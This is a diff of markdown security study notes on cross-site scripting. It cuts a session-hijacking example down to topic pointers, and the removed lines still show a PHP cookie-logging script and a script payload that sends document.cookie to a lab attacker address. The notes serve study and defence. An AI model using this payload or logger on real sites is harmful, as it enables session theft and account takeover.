@@ -11,26 +11,10 @@
       -  ```getElementById()```
       - ```document.write()```
 
-
 ## Exploitation
-### Session Hijacking
-- Cookie Stealer (PHP for Apache web server)
-```PHP
-<?php
-$Cookie=$_GET['txt'];
-$log="Cookie=$cookie\r\n";
-$f=fopen("log.txt","a");
-fwrite($f,$log);
-?>
-```
-- XSS Payload
-```javascript
-<script>window.location="http://192.168.1.16/cookie1.php?txt=" + document.cookie;</script>
-```
-### Fake Page
-- g
-
-### [BeEF](../Tools/beef.md)
+- Session Hijacking (SEC542-4)
+- Fake Page (SEC542-4)
+- [BeEF](../Tools/beef.md)
 
 ## Mitigation
 - Minimize the usage of user input on html
